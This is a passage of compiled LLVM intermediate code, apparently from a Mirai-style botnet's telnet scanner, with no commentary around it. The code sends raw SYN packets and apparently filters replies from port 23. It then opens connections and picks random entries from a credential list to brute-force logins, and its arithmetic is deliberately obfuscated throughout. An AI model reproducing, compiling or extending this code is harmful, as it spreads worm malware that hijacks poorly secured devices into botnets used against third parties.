  %267 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 6
  store i16 %266, i16* %268, align 4
  %269 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %269, align 4
  %270 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 9
  %272 = load i32, i32* %271, align 4
  %273 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %274 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %273, i32 0, i32 0
  store i32 %272, i32* %274, align 4
  %275 = load %struct.tcphdr*, %struct.tcphdr** %16, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 1
  %277 = load i16, i16* %276, align 2
  %278 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %277, i16* %278, align 2
  %279 = load i32, i32* @rsck, align 4
  %280 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %281 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %281, %struct.sockaddr** %280, align 8
  %282 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %283 = load %struct.sockaddr*, %struct.sockaddr** %282, align 8
  %284 = call i64 @sendto(i32 %279, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %283, i32 16)
  br label %285

; <label>:285:                                    ; preds = %230
  %286 = load i32, i32* %1, align 4
  %287 = add i32 %286, -260096678
  %288 = add i32 %287, 1
  %289 = sub i32 %288, -260096678
  %290 = add nsw i32 %286, 1
  store i32 %289, i32* %1, align 4
  br label %227

; <label>:291:                                    ; preds = %227
  br label %292

; <label>:292:                                    ; preds = %291, %221
  store i32 0, i32* %9, align 4
  br label %293

; <label>:293:                                    ; preds = %446, %416, %402, %387, %376, %365, %354, %345, %336, %329, %322, %292
  %294 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %295 = bitcast i8* %294 to %struct.iphdr*
  store %struct.iphdr* %295, %struct.iphdr** %20, align 8
  %296 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i64 1
  %298 = bitcast %struct.iphdr* %297 to %struct.tcphdr*
  store %struct.tcphdr* %298, %struct.tcphdr** %21, align 8
  %299 = call i32* @__errno_location() #7
  store i32 0, i32* %299, align 4
  %300 = load i32, i32* @rsck, align 4
  %301 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %302 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %302, align 8
  %303 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %304 = load %struct.sockaddr*, %struct.sockaddr** %303, align 8
  %305 = call i64 @recvfrom(i32 %300, i8* %301, i64 1514, i32 16384, %struct.sockaddr* %304, i32* null)
  %306 = trunc i64 %305 to i32
  store i32 %306, i32* %18, align 4
  %307 = load i32, i32* %18, align 4
  %308 = icmp sle i32 %307, 0
  br i1 %308, label %317, label %309

; <label>:309:                                    ; preds = %293
  %310 = call i32* @__errno_location() #7
  %311 = load i32, i32* %310, align 4
  %312 = icmp eq i32 %311, 11
  br i1 %312, label %317, label %313

; <label>:313:                                    ; preds = %309
  %314 = call i32* @__errno_location() #7
  %315 = load i32, i32* %314, align 4
  %316 = icmp eq i32 %315, 11
  br i1 %316, label %317, label %318

; <label>:317:                                    ; preds = %313, %309, %293
  br label %458

; <label>:318:                                    ; preds = %313
  %319 = load i32, i32* %18, align 4
  %320 = sext i32 %319 to i64
  %321 = icmp ult i64 %320, 40
  br i1 %321, label %322, label %323

; <label>:322:                                    ; preds = %318
  br label %293

; <label>:323:                                    ; preds = %318
  %324 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %325 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %324, i32 0, i32 9
  %326 = load i32, i32* %325, align 4
  %327 = load i32, i32* @LOCAL_ADDR, align 4
  %328 = icmp ne i32 %326, %327
  br i1 %328, label %329, label %330

; <label>:329:                                    ; preds = %323
  br label %293

; <label>:330:                                    ; preds = %323
  %331 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %332 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %331, i32 0, i32 6
  %333 = load i8, i8* %332, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp ne i32 %334, 6
  br i1 %335, label %336, label %337

; <label>:336:                                    ; preds = %330
  br label %293

; <label>:337:                                    ; preds = %330
  %338 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %339 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %338, i32 0, i32 0
  %340 = load i16, i16* %339, align 4
  %341 = zext i16 %340 to i32
  %342 = call zeroext i16 @htons(i16 zeroext 23) #7
  %343 = zext i16 %342 to i32
  %344 = icmp ne i32 %341, %343
  br i1 %344, label %345, label %346

; <label>:345:                                    ; preds = %337
  br label %293

; <label>:346:                                    ; preds = %337
  %347 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %348 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %347, i32 0, i32 1
  %349 = load i16, i16* %348, align 2
  %350 = zext i16 %349 to i32
  %351 = load i16, i16* %2, align 2
  %352 = zext i16 %351 to i32
  %353 = icmp ne i32 %350, %352
  br i1 %353, label %354, label %355

; <label>:354:                                    ; preds = %346
  br label %293

; <label>:355:                                    ; preds = %346
  %356 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = lshr i16 %358, 9
  %360 = xor i16 1, -1
  %361 = xor i16 %359, %360
  %362 = and i16 %361, %359
  %363 = and i16 %359, 1
  %364 = icmp ne i16 %362, 0
  br i1 %364, label %366, label %365

; <label>:365:                                    ; preds = %355
  br label %293

; <label>:366:                                    ; preds = %355
  %367 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 4
  %369 = load i16, i16* %368, align 4
  %370 = lshr i16 %369, 12
  %371 = xor i16 1, -1
  %372 = xor i16 %370, %371
  %373 = and i16 %372, %370
  %374 = and i16 %370, 1
  %375 = icmp ne i16 %373, 0
  br i1 %375, label %377, label %376

; <label>:376:                                    ; preds = %366
  br label %293

; <label>:377:                                    ; preds = %366
  %378 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i32 0, i32 4
  %380 = load i16, i16* %379, align 4
  %381 = lshr i16 %380, 10
  %382 = xor i16 1, -1
  %383 = xor i16 %381, %382
  %384 = and i16 %383, %381
  %385 = and i16 %381, 1
  %386 = icmp ne i16 %384, 0
  br i1 %386, label %387, label %388

; <label>:387:                                    ; preds = %377
  br label %293

; <label>:388:                                    ; preds = %377
  %389 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = lshr i16 %391, 8
  %393 = xor i16 %392, -1
  %394 = xor i16 1, -1
  %395 = xor i16 9688, -1
  %396 = or i16 %393, %394
  %397 = or i16 9688, %395
  %398 = xor i16 %396, -1
  %399 = and i16 %398, %397
  %400 = and i16 %392, 1
  %401 = icmp ne i16 %399, 0
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %388
  br label %293

; <label>:403:                                    ; preds = %388
  %404 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  %406 = load i32, i32* %405, align 4
  %407 = call i32 @ntohl(i32 %406) #7
  %408 = sub i32 0, 1
  %409 = add i32 %407, %408
  %410 = sub i32 %407, 1
  %411 = call i32 @htonl(i32 %409) #7
  %412 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  %414 = load i32, i32* %413, align 4
  %415 = icmp ne i32 %411, %414
  br i1 %415, label %416, label %417

; <label>:416:                                    ; preds = %403
  br label %293

; <label>:417:                                    ; preds = %403
  store %struct.scanner_connection* null, %struct.scanner_connection** %22, align 8
  %418 = load i32, i32* %9, align 4
  store i32 %418, i32* %18, align 4
  br label %419

; <label>:419:                                    ; preds = %437, %417
  %420 = load i32, i32* %18, align 4
  %421 = icmp slt i32 %420, 256
  br i1 %421, label %422, label %442

; <label>:422:                                    ; preds = %419
  %423 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %424 = load i32, i32* %18, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %423, i64 %425
  %427 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %426, i32 0, i32 3
  %428 = load i32, i32* %427, align 8
  %429 = icmp eq i32 %428, 0
  br i1 %429, label %430, label %436

; <label>:430:                                    ; preds = %422
  %431 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %432 = load i32, i32* %18, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %431, i64 %433
  store %struct.scanner_connection* %434, %struct.scanner_connection** %22, align 8
  %435 = load i32, i32* %18, align 4
  store i32 %435, i32* %9, align 4
  br label %442

; <label>:436:                                    ; preds = %422
  br label %437

; <label>:437:                                    ; preds = %436
  %438 = load i32, i32* %18, align 4
  %439 = sub i32 0, 1
  %440 = sub i32 %438, %439
  %441 = add nsw i32 %438, 1
  store i32 %440, i32* %18, align 4
  br label %419

; <label>:442:                                    ; preds = %430, %419
  %443 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %444 = icmp eq %struct.scanner_connection* %443, null
  br i1 %444, label %445, label %446

; <label>:445:                                    ; preds = %442
  br label %458

; <label>:446:                                    ; preds = %442
  %447 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 8
  %449 = load i32, i32* %448, align 4
  %450 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %451 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %450, i32 0, i32 4
  store i32 %449, i32* %451, align 4
  %452 = load %struct.tcphdr*, %struct.tcphdr** %21, align 8
  %453 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %452, i32 0, i32 0
  %454 = load i16, i16* %453, align 4
  %455 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  %456 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %455, i32 0, i32 5
  store i16 %454, i16* %456, align 8
  %457 = load %struct.scanner_connection*, %struct.scanner_connection** %22, align 8
  call void @setup_connection(%struct.scanner_connection* %457)
  br label %293

; <label>:458:                                    ; preds = %445, %317
  br label %459

; <label>:459:                                    ; preds = %458
  %460 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %461 = getelementptr inbounds [16 x i64], [16 x i64]* %460, i64 0, i64 0
  %462 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %461) #6, !srcloc !1
  %463 = extractvalue { i64, i64* } %462, 0
  %464 = extractvalue { i64, i64* } %462, 1
  %465 = trunc i64 %463 to i32
  store i32 %465, i32* %24, align 4
  %466 = ptrtoint i64* %464 to i64
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %25, align 4
  br label %468

; <label>:468:                                    ; preds = %459
  br label %469

; <label>:469:                                    ; preds = %468
  %470 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %471 = getelementptr inbounds [16 x i64], [16 x i64]* %470, i64 0, i64 0
  %472 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %471) #6, !srcloc !2
  %473 = extractvalue { i64, i64* } %472, 0
  %474 = extractvalue { i64, i64* } %472, 1
  %475 = trunc i64 %473 to i32
  store i32 %475, i32* %26, align 4
  %476 = ptrtoint i64* %474 to i64
  %477 = trunc i64 %476 to i32
  store i32 %477, i32* %27, align 4
  br label %478

; <label>:478:                                    ; preds = %469
  store i32 0, i32* %1, align 4
  br label %479

; <label>:479:                                    ; preds = %623, %478
  %480 = load i32, i32* %1, align 4
  %481 = icmp slt i32 %480, 256
  br i1 %481, label %482, label %630

; <label>:482:                                    ; preds = %479
  %483 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %484 = load i32, i32* %1, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %483, i64 %485
  store %struct.scanner_connection* %486, %struct.scanner_connection** %7, align 8
  %487 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %488 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %487, i32 0, i32 3
  %489 = load i32, i32* %488, align 8
  %490 = icmp ugt i32 %489, 1
  %491 = select i1 %490, i32 30, i32 5
  store i32 %491, i32* %28, align 4
  %492 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %493 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %492, i32 0, i32 3
  %494 = load i32, i32* %493, align 8
  %495 = icmp ne i32 %494, 0
  br i1 %495, label %496, label %541

; <label>:496:                                    ; preds = %482
  %497 = load i32, i32* @fake_time, align 4
  %498 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %499 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %498, i32 0, i32 2
  %500 = load i32, i32* %499, align 4
  %501 = add i32 %497, 1073490272
  %502 = sub i32 %501, %500
  %503 = sub i32 %502, 1073490272
  %504 = sub i32 %497, %500
  %505 = load i32, i32* %28, align 4
  %506 = icmp ugt i32 %503, %505
  br i1 %506, label %507, label %541

; <label>:507:                                    ; preds = %496
  %508 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %509 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %508, i32 0, i32 1
  %510 = load i32, i32* %509, align 8
  %511 = call i32 @close(i32 %510)
  %512 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %513 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %512, i32 0, i32 1
  store i32 -1, i32* %513, align 8
  %514 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %515 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %514, i32 0, i32 3
  %516 = load i32, i32* %515, align 8
  %517 = icmp ugt i32 %516, 2
  br i1 %517, label %518, label %535

; <label>:518:                                    ; preds = %507
  %519 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %520 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %519, i32 0, i32 8
  %521 = load i8, i8* %520, align 8
  %522 = sub i8 0, 1
  %523 = sub i8 %521, %522
  %524 = add i8 %521, 1
  store i8 %523, i8* %520, align 8
  %525 = zext i8 %523 to i32
  %526 = icmp eq i32 %525, 10
  br i1 %526, label %527, label %532

; <label>:527:                                    ; preds = %518
  %528 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %529 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %528, i32 0, i32 8
  store i8 0, i8* %529, align 8
  %530 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %531 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %530, i32 0, i32 3
  store i32 0, i32* %531, align 8
  br label %534

; <label>:532:                                    ; preds = %518
  %533 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %533)
  br label %534

; <label>:534:                                    ; preds = %532, %527
  br label %540

; <label>:535:                                    ; preds = %507
  %536 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %537 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %536, i32 0, i32 8
  store i8 0, i8* %537, align 8
  %538 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %539 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %538, i32 0, i32 3
  store i32 0, i32* %539, align 8
  br label %540

; <label>:540:                                    ; preds = %535, %534
  br label %623

; <label>:541:                                    ; preds = %496, %482
  %542 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %543 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %542, i32 0, i32 3
  %544 = load i32, i32* %543, align 8
  %545 = icmp eq i32 %544, 1
  br i1 %545, label %546, label %587

; <label>:546:                                    ; preds = %541
  %547 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %548 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %547, i32 0, i32 1
  %549 = load i32, i32* %548, align 8
  %550 = srem i32 %549, 64
  %551 = zext i32 %550 to i64
  %552 = shl i64 1, %551
  %553 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %554 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %555 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %554, i32 0, i32 1
  %556 = load i32, i32* %555, align 8
  %557 = sdiv i32 %556, 64
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds [16 x i64], [16 x i64]* %553, i64 0, i64 %558
  %560 = load i64, i64* %559, align 8
  %561 = xor i64 %560, -1
  %562 = xor i64 %552, -1
  %563 = xor i64 1120772497886773964, -1
  %564 = and i64 %561, 1120772497886773964
  %565 = and i64 %560, %563
  %566 = and i64 %562, 1120772497886773964
  %567 = and i64 %552, %563
  %568 = or i64 %564, %565
  %569 = or i64 %566, %567
  %570 = xor i64 %568, %569
  %571 = or i64 %561, %562
  %572 = xor i64 %571, -1
  %573 = or i64 1120772497886773964, %563
  %574 = and i64 %572, %573
  %575 = or i64 %570, %574
  %576 = or i64 %560, %552
  store i64 %575, i64* %559, align 8
  %577 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %578 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %577, i32 0, i32 1
  %579 = load i32, i32* %578, align 8
  %580 = load i32, i32* %12, align 4
  %581 = icmp sgt i32 %579, %580
  br i1 %581, label %582, label %586

; <label>:582:                                    ; preds = %546
  %583 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %583, i32 0, i32 1
  %585 = load i32, i32* %584, align 8
  store i32 %585, i32* %12, align 4
  br label %586

; <label>:586:                                    ; preds = %582, %546
  br label %622

; <label>:587:                                    ; preds = %541
  %588 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %589 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %588, i32 0, i32 3
  %590 = load i32, i32* %589, align 8
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %592, label %621

; <label>:592:                                    ; preds = %587
  %593 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %593, i32 0, i32 1
  %595 = load i32, i32* %594, align 8
  %596 = srem i32 %595, 64
  %597 = zext i32 %596 to i64
  %598 = shl i64 1, %597
  %599 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %600 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %601 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %600, i32 0, i32 1
  %602 = load i32, i32* %601, align 8
  %603 = sdiv i32 %602, 64
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds [16 x i64], [16 x i64]* %599, i64 0, i64 %604
  %606 = load i64, i64* %605, align 8
  %607 = and i64 %606, %598
  %608 = xor i64 %606, %598
  %609 = or i64 %607, %608
  %610 = or i64 %606, %598
  store i64 %609, i64* %605, align 8
  %611 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %612 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %611, i32 0, i32 1
  %613 = load i32, i32* %612, align 8
  %614 = load i32, i32* %11, align 4
  %615 = icmp sgt i32 %613, %614
  br i1 %615, label %616, label %620

; <label>:616:                                    ; preds = %592
  %617 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %617, i32 0, i32 1
  %619 = load i32, i32* %618, align 8
  store i32 %619, i32* %11, align 4
  br label %620

; <label>:620:                                    ; preds = %616, %592
  br label %621

; <label>:621:                                    ; preds = %620, %587
  br label %622

; <label>:622:                                    ; preds = %621, %586
  br label %623

; <label>:623:                                    ; preds = %622, %540
  %624 = load i32, i32* %1, align 4
  %625 = sub i32 0, %624
  %626 = sub i32 0, 1
  %627 = add i32 %625, %626
  %628 = sub i32 0, %627
  %629 = add nsw i32 %624, 1
  store i32 %628, i32* %1, align 4
  br label %479

; <label>:630:                                    ; preds = %479
  %631 = getelementptr inbounds %struct.timeval.19, %struct.timeval.19* %8, i32 0, i32 1
  store i64 0, i64* %631, align 8
  %632 = getelementptr inbounds %struct.timeval.19, %struct.timeval.19* %8, i32 0, i32 0
  store i64 1, i64* %632, align 8
  %633 = load i32, i32* %12, align 4
  %634 = load i32, i32* %11, align 4
  %635 = icmp sgt i32 %633, %634
  br i1 %635, label %636, label %638

; <label>:636:                                    ; preds = %630
  %637 = load i32, i32* %12, align 4
  br label %640

; <label>:638:                                    ; preds = %630
  %639 = load i32, i32* %11, align 4
  br label %640

; <label>:640:                                    ; preds = %638, %636
  %641 = phi i32 [ %637, %636 ], [ %639, %638 ]
  %642 = sub i32 0, %641
  %643 = sub i32 1, %642
  %644 = add nsw i32 1, %641
  %645 = call i32 @select(i32 %643, %struct.fd_set.18* %5, %struct.fd_set.18* %6, %struct.fd_set.18* null, %struct.timeval.19* %8)
  store i32 %645, i32* %13, align 4
  %646 = call i64 @time(i64* null) #6
  %647 = trunc i64 %646 to i32
  store i32 %647, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %648

; <label>:648:                                    ; preds = %1098, %640
  %649 = load i32, i32* %1, align 4
  %650 = icmp slt i32 %649, 256
  br i1 %650, label %651, label %1104

; <label>:651:                                    ; preds = %648
  %652 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %653 = load i32, i32* %1, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %652, i64 %654
  store %struct.scanner_connection* %655, %struct.scanner_connection** %7, align 8
  %656 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %657 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %656, i32 0, i32 1
  %658 = load i32, i32* %657, align 8
  %659 = icmp eq i32 %658, -1
  br i1 %659, label %660, label %661

; <label>:660:                                    ; preds = %651
  br label %1098

; <label>:661:                                    ; preds = %651
  %662 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %6, i32 0, i32 0
  %663 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %664 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %663, i32 0, i32 1
  %665 = load i32, i32* %664, align 8
  %666 = sdiv i32 %665, 64
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds [16 x i64], [16 x i64]* %662, i64 0, i64 %667
  %669 = load i64, i64* %668, align 8
  %670 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %671 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %670, i32 0, i32 1
  %672 = load i32, i32* %671, align 8
  %673 = srem i32 %672, 64
  %674 = zext i32 %673 to i64
  %675 = shl i64 1, %674
  %676 = xor i64 %669, -1
  %677 = xor i64 %675, -1
  %678 = xor i64 4328530449824686308, -1
  %679 = or i64 %676, %677
  %680 = or i64 4328530449824686308, %678
  %681 = xor i64 %679, -1
  %682 = and i64 %681, %680
  %683 = and i64 %669, %675
  %684 = icmp ne i64 %682, 0
  br i1 %684, label %685, label %716

; <label>:685:                                    ; preds = %661
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %686 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %687 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %686, i32 0, i32 1
  %688 = load i32, i32* %687, align 8
  %689 = bitcast i32* %29 to i8*
  %690 = call i32 @getsockopt(i32 %688, i32 1, i32 4, i8* %689, i32* %31) #6
  store i32 %690, i32* %30, align 4
  %691 = load i32, i32* %29, align 4
  %692 = icmp eq i32 %691, 0
  br i1 %692, label %693, label %704

; <label>:693:                                    ; preds = %685
  %694 = load i32, i32* %30, align 4
  %695 = icmp eq i32 %694, 0
  br i1 %695, label %696, label %704

; <label>:696:                                    ; preds = %693
  %697 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %698 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %697, i32 0, i32 3
  store i32 2, i32* %698, align 8
  %699 = call %struct.scanner_auth* @random_auth_entry()
  %700 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %701 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %700, i32 0, i32 0
  store %struct.scanner_auth* %699, %struct.scanner_auth** %701, align 8
  %702 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %703 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %702, i32 0, i32 6
  store i32 0, i32* %703, align 4
  br label %715

; <label>:704:                                    ; preds = %693, %685
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 1
  %707 = load i32, i32* %706, align 8
  %708 = call i32 @close(i32 %707)
  %709 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %710 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %709, i32 0, i32 1
  store i32 -1, i32* %710, align 8
  %711 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %712 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %711, i32 0, i32 8
  store i8 0, i8* %712, align 8
  %713 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %713, i32 0, i32 3
  store i32 0, i32* %714, align 8
  br label %1098

; <label>:715:                                    ; preds = %696
  br label %716

; <label>:716:                                    ; preds = %715, %661
  %717 = getelementptr inbounds %struct.fd_set.18, %struct.fd_set.18* %5, i32 0, i32 0
  %718 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %718, i32 0, i32 1
  %720 = load i32, i32* %719, align 8
  %721 = sdiv i32 %720, 64
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds [16 x i64], [16 x i64]* %717, i64 0, i64 %722
  %724 = load i64, i64* %723, align 8
  %725 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %726 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %725, i32 0, i32 1
  %727 = load i32, i32* %726, align 8
  %728 = srem i32 %727, 64
  %729 = zext i32 %728 to i64
  %730 = shl i64 1, %729
  %731 = xor i64 %724, -1
  %732 = xor i64 %730, -1
  %733 = xor i64 -2007651399104262008, -1
  %734 = or i64 %731, %732
  %735 = or i64 -2007651399104262008, %733
  %736 = xor i64 %734, -1
  %737 = and i64 %736, %735
  %738 = and i64 %724, %730
  %739 = icmp ne i64 %737, 0
  br i1 %739, label %740, label %1097

; <label>:740:                                    ; preds = %716
  br label %741

; <label>:741:                                    ; preds = %1095, %740
  %742 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %743 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %742, i32 0, i32 3
  %744 = load i32, i32* %743, align 8
  %745 = icmp eq i32 %744, 0
  br i1 %745, label %746, label %747

; <label>:746:                                    ; preds = %741
  br label %1096

; <label>:747:                                    ; preds = %741
  %748 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %749 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %748, i32 0, i32 6
  %750 = load i32, i32* %749, align 4
  %751 = icmp eq i32 %750, 256
  br i1 %751, label %752, label %767

; <label>:752:                                    ; preds = %747
  %753 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %754 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %753, i32 0, i32 7
  %755 = getelementptr inbounds [256 x i8], [256 x i8]* %754, i32 0, i32 0
  %756 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
